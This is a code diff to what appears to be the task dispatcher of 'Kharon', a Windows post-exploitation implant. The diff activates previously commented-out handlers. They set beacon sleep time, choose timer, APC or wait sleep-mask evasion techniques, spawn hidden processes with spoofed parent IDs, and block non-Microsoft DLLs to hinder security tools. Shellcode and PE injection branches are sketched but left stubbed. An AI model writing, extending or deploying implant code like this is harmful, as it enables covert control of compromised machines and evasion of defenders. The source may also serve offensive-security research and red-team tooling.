@@ -11,9 +11,9 @@ auto DECLFN Task::Dispatcher(
 auto DECLFN Task::SleepTime(
     _In_ PPARSER Parser
 ) -> ERROR_CODE {
-    // ULONG NewSleepTime = Parser::GetInt32( Parser );
+    ULONG NewSleepTime = Parser::GetInt32( Parser );
     
-    // Kharon::Session.SleepTime = NewSleepTime;
+    Kharon::Session.SleepTime = NewSleepTime;
 
     KhDbg( "sleep time set to %d\n", Kharon::Session.SleepTime );
 
@@ -24,13 +24,13 @@ auto DECLFN Task::Injection(
     _In_ PPARSER Parser
 ) -> ERROR_CODE {
     PPACKAGE Package = Package::Create( TskInjection );
-    // UINT8    TypeInj = Parser::GetByte( Parser );
+    UINT8    TypeInj = Parser::GetByte( Parser );
 
-    // if ( TypeInj == SbInjShellcode ) {
+    if ( TypeInj == SbInjShellcode ) {
         // return Injection::Sc(  );
-    // } else if ( TypeInj == SbInjPE ) {
+    } else if ( TypeInj == SbInjPE ) {
         // return Injection::Pe(  );
-    // }
+    }
 
     return KhRetError( KH_ERROR_INVALID_INJECTION_ID );
 }
@@ -39,20 +39,20 @@ auto DECLFN Task::SleepMask(
     _In_ PPARSER Parser
 ) -> ERROR_CODE {
     PPACKAGE Package  = Package::Create( TskSleepMask );
-    // UINT8 TechniqueID = Parser::GetByte( Parser );
-    // if ( !TechniqueID ) {
-    //     KhDbg( "invalid mask id" );
-    //     return KH_ERROR_INVALID_MASK_ID;
-    // }
+    UINT8 TechniqueID = Parser::GetByte( Parser );
+    if ( !TechniqueID ) {
+        KhDbg( "invalid mask id" );
+        return KH_ERROR_INVALID_MASK_ID;
+    }
 
-    // Mask.TechniqueID = TechniqueID;
+    Mask.TechniqueID = TechniqueID;
 
-    // KhDbg( 
-    //     "mask technique id set to %d (%s)", Mask.TechniqueID, 
-    //       Mask.TechniqueID == MaskTimer ? "timer" : 
-    //     ( Mask.TechniqueID == MaskApc   ? "apc" : 
-    //     ( Mask.TechniqueID == MaskWait  ? "wait" : "unknown" ) )
-    // );
+    KhDbg( 
+        "mask technique id set to %d (%s)", Mask.TechniqueID, 
+          Mask.TechniqueID == MaskTimer ? "timer" : 
+        ( Mask.TechniqueID == MaskApc   ? "apc" : 
+        ( Mask.TechniqueID == MaskWait  ? "wait" : "unknown" ) )
+    );
 
     Package::Transmit( Package, 0, 0 );
 
@@ -120,52 +120,52 @@ auto DECLFN Task::Process(
     _In_ PPARSER Parser
 ) -> ERROR_CODE {
     PPACKAGE Package     = Package::Create( TskProcess );
-    // ULONG    SbCommandID = Parser::GetInt32( Parser );
-    // ULONG    TmpVal      = 0;
-    // BOOL     Success     = FALSE;
+    ULONG    SbCommandID = Parser::GetInt32( Parser );
+    ULONG    TmpVal      = 0;
+    BOOL     Success     = FALSE;
 
-    // switch ( SbCommandID ) {
-    // case SbPsCreate: {
-    //     // PCHAR               CommandLine = Parser::GetStr( Parser, &TmpVal );
-    //     PROCESS_INFORMATION PsInfo      = { 0 };
-    //     Success = Process::Create( Package, CommandLine, CREATE_NO_WINDOW, &PsInfo );
-    //     if ( !Success ) return KhGetError();
+    switch ( SbCommandID ) {
+    case SbPsCreate: {
+        PCHAR               CommandLine = Parser::GetStr( Parser, &TmpVal );
+        PROCESS_INFORMATION PsInfo      = { 0 };
+        Success = Process::Create( Package, CommandLine, CREATE_NO_WINDOW, &PsInfo );
+        if ( !Success ) return KhGetError();
 
-    //     Package::AddInt32( Package, PsInfo.dwProcessId );
-    //     Package::AddInt32( Package, PsInfo.dwThreadId  );
+        Package::AddInt32( Package, PsInfo.dwProcessId );
+        Package::AddInt32( Package, PsInfo.dwThreadId  );
         
-    //     break;
-    // }
-    // case SbPsPpid: {
-    //     // ULONG ParentID = Parser::GetInt32( Parser );
-    //     Ps.ParentID = ParentID;
+        break;
+    }
+    case SbPsPpid: {
+        ULONG ParentID = Parser::GetInt32( Parser );
+        Ps.ParentID = ParentID;
 
-    //     KhDbg( "parent ID set to %d\n", Ps.ParentID ); break;
-    // }
-    // case SbPsBlockDlls: {
-    //     // BOOL BlockDlls  = Parser::GetByte( Parser );
-    //     Ps.BlockDlls = BlockDlls;
+        KhDbg( "parent ID set to %d\n", Ps.ParentID ); break;
+    }
+    case SbPsBlockDlls: {
+        BOOL BlockDlls  = Parser::GetByte( Parser );
+        Ps.BlockDlls = BlockDlls;
         
-    //     KhDbg( "block non microsoft dlls is %s\n", Ps.BlockDlls ? "enabled" : "disabled" );
+        KhDbg( "block non microsoft dlls is %s\n", Ps.BlockDlls ? "enabled" : "disabled" );
 
-    //     break;
-    // }
-    // case SbPsList: {
-    //     break;
-    // }
-    // case SbPsCurDir: {
-    //     if ( Ps.CurrentDir ) {
-    //         Heap().Free( Ps.CurrentDir, Str::LengthA( Ps.CurrentDir ) );
-    //     }
+        break;
+    }
+    case SbPsList: {
+        break;
+    }
+    case SbPsCurDir: {
+        if ( Ps.CurrentDir ) {
+            Heap().Free( Ps.CurrentDir, Str::LengthA( Ps.CurrentDir ) );
+        }
 
-    //     // PCHAR CurDirTmp  = Parser::GetStr( Parser, &TmpVal );
-    //     PCHAR CurrentDir = A_PTR( Heap().Alloc( TmpVal ) );
+        PCHAR CurDirTmp  = Parser::GetStr( Parser, &TmpVal );
+        PCHAR CurrentDir = A_PTR( Heap().Alloc( TmpVal ) );
 
-    //     Mem::Copy( CurrentDir, CurDirTmp, TmpVal );
+        Mem::Copy( CurrentDir, CurDirTmp, TmpVal );
 
-    //     Ps.CurrentDir = CurrentDir; break;
-    // }
+        Ps.CurrentDir = CurrentDir; break;
+    }
 
         KhRetSuccess;
-    // } 
+    } 
 }
